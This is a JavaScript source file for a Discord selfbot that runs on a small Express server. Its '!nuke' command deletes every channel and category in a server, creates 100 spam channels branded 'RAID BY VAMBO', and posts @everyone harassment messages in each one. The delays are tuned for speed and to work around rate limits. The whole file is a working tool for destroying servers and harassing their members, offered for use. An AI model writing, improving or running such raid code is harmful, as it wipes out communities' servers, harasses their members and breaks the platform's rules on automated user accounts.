const { Client } = require('discord.js-selfbot-v13');
const client = new Client();

// Use environment variable for security
const TOKEN = process.env.DISCORD_TOKEN;
const PREFIX = '!';

// Web server for Railway
const express = require('express');
const app = express();
const PORT = process.env.PORT || 3000;

app.get('/', (req, res) => {
    res.send('Nuke selfbot is running!');
});

app.listen(PORT, () => {
    console.log(`Web server running on port ${PORT}`);
});

client.on('ready', () => {
    console.log(`✅ Logged in as ${client.user.tag}`);
    console.log(`Selfbot is ready in ${client.guilds.cache.size} servers`);
    console.log(`Type !nuke in any channel to destroy the server`);
});

// Helper function for safe sending
async function safeSend(channel, content) {
    try {
        if (channel && !channel.deleted) {
            await channel.send(content);
        }
    } catch (error) {
        // Silently ignore
    }
}

client.on('messageCreate', async (message) => {
    if (message.author.id !== client.user.id) return;
    if (!message.content.startsWith(PREFIX)) return;

    const args = message.content.slice(PREFIX.length).trim().split(/ +/);
    const command = args.shift().toLowerCase();

    // ===== THEMED NUKE COMMAND =====
    if (command === 'nuke') {
        const guild = message.guild;
        const originalChannel = message.channel;
        
        if (!guild) {
            await safeSend(originalChannel, 'This command only works in servers!');
            return;
        }

        console.log(`💣 Starting themed nuke on ${guild.name}`);
        
        // THEMED ASCII ART INTRODUCTION
        const asciiArt = `
\`\`\`
██████╗  █████╗ ██╗██████╗ ███████╗██████╗ 
██╔══██╗██╔══██╗██║██╔══██╗██╔════╝██╔══██╗
██████╔╝███████║██║██║  ██║█████╗  ██████╔╝
██╔══██╗██╔══██║██║██║  ██║██╔══╝  ██╔══██╗
██║  ██║██║  ██║██║██████╔╝███████╗██║  ██║
╚═╝  ╚═╝╚═╝  ╚═╝╚═╝╚═════╝ ╚══════╝╚═╝  ╚═╝
                                                 
██╗   ██╗ █████╗ ███╗   ███╗██████╗  ██████╗ 
██║   ██║██╔══██╗████╗ ████║██╔══██╗██╔═══██╗
██║   ██║███████║██╔████╔██║██████╔╝██║   ██║
╚██╗ ██╔╝██╔══██║██║╚██╔╝██║██╔══██╗██║   ██║
 ╚████╔╝ ██║  ██║██║ ╚═╝ ██║██████╔╝╚██████╔╝
  ╚═══╝  ╚═╝  ╚═╝╚═╝     ╚═╝╚═════╝  ╚═════╝ 
\`\`\`
🔥 **RAID INITIATED BY VAMBO** 🔥
`;

        // Send themed intro
        await safeSend(originalChannel, asciiArt);

        // ===== PHASE 1: DELETE ALL CHANNELS (FASTER) =====
        let deletedCount = 0;
        let deleteFailed = 0;
        
        // Get all channels
        const channels = [...guild.channels.cache.values()];
        
        // Delete non-category channels first (with REDUCED DELAY = FASTER)
        const nonCategoryChannels = channels.filter(c => c.type !== 'GUILD_CATEGORY');
        const categoryChannels = channels.filter(c => c.type === 'GUILD_CATEGORY');
        
        // Delete faster - only 300ms delay instead of 800ms
        for (const channel of nonCategoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 300)); // FASTER!
            } catch (error) {
                deleteFailed++;
            }
        }
        
        // Delete categories (also faster)
        for (const channel of categoryChannels) {
            try {
                await channel.delete();
                deletedCount++;
                console.log(`✅ Deleted category: ${channel.name}`);
                await new Promise(resolve => setTimeout(resolve, 300)); // FASTER!
            } catch (error) {
                deleteFailed++;
            }
        }
        
        console.log(`✅ Deleted ${deletedCount} channels`);

        // ===== PHASE 2: CREATE 100 THEMED CHANNELS =====
        
        // THEMED CHANNEL NAMES (variety for better look)
        const channelNames = [
            'R҉A҉I҉D҉-҉B҉Y҉-҉V҉A҉M҉B҉O҉',
            '🔥-VAMBO-WAS-HERE-🔥',
            '💀-SERVER-GOT-NUKED-💀',
            '⚡-RAIDED-⚡',
            '🎯-GET-REKT-🎯',
            '👑-VAMBO-👑',
            '💣-BOOM-💣',
            '🔱-VAMBO-🔱',
            '🌪️-DESTROYED-🌪️',
            '⚔️-VAMBO-ATTACK-⚔️'
        ];
        
        // THEMED RAID MESSAGES (much better visual theme)
        const raidMessages = [
            `@everyone @here **⚡⚡⚡ RAIDED BY VAMBO ⚡⚡⚡**

\`\`\`diff
+ SERVER HAS BEEN DESTROYED
- YOU CAN'T STOP US
! VAMBO RULES
\`\`\`

### NEVER SCAM AGAIN SON 😂
            😯 KICK ROCKS 😯

https://media.tenor.com/hWmpAzAlsm4AAAAM/ishowspeed-scary-speed.gif

**🔥 VAMBO WAS HERE 🔥**`,

            `@everyone @here **💀💀💀 SYSTEM BREACH 💀💀💀**

\`\`\`asciidoc
= VAMBO RAID TEAM =
* Server Status :: DESTROYED
* Resistance :: FUTILE
* Outcome :: GET REKT
\`\`\`

### SAY GOODBYE TO YOUR SERVER 👋
            😂 TOO EASY 😂

**👑 VAMBO 👑**`,

            `@everyone @here **🔥🔥🔥 NUKE COMPLETE 🔥🔥🔥**

\`\`\`css
[VAMBO RAID TEAM]
[All channels deleted]
[100 spam channels created]
[Your server = garbage]
\`\`\`

### NEVER SCAM AGAIN 😂
            💀 KICK ROCKS 💀

**⚡ VAMBO ⚡**`
        ];

        let createdCount = 0;
        let createFailed = 0;

        // Create 100 channels FASTER (600ms instead of 1200ms)
        for (let i = 0; i < 100; i++) {
            try {
                // Cycle through themed names
                const nameIndex = i % channelNames.length;
                const channelName = `${channelNames[nameIndex]}-${i+1}`;
                
                // Create channel
                const newChannel = await guild.channels.create(channelName, {
                    type: 'text'
                });
                
                // Cycle through themed messages
                const messageIndex = i % raidMessages.length;
                await newChannel.send(raidMessages[messageIndex]);
                
                createdCount++;
                console.log(`✅ Created channel ${i+1}/100`);
                
                // FASTER delay (600ms instead of 1200ms)
                await new Promise(resolve => setTimeout(resolve, 600));
                
            } catch (error) {
                createFailed++;
                console.log(`❌ Failed channel ${i+1}: ${error.message}`);
                
                // If rate limited, wait but shorter
                if (error.message.includes('rate')) {
                    console.log('⏳ Quick rate limit pause...');
                    await new Promise(resolve => setTimeout(resolve, 2000)); // Reduced from 5s
                }
            }
        }

        // NO FINAL ANNOUNCEMENT CHANNEL (as requested)

        // Log final results to console
        console.log('='.repeat(50));
        console.log('💀 **NUKE COMPLETE** 💀');
        console.log(`✅ Deleted: ${deletedCount} channels`);
        console.log(`✅ Created: ${createdCount} raid channels`);
        console.log(`❌ Delete failures: ${deleteFailed}`);
        console.log(`❌ Create failures: ${createFailed}`);
        console.log('='.repeat(50));
    }
});

client.login(TOKEN);
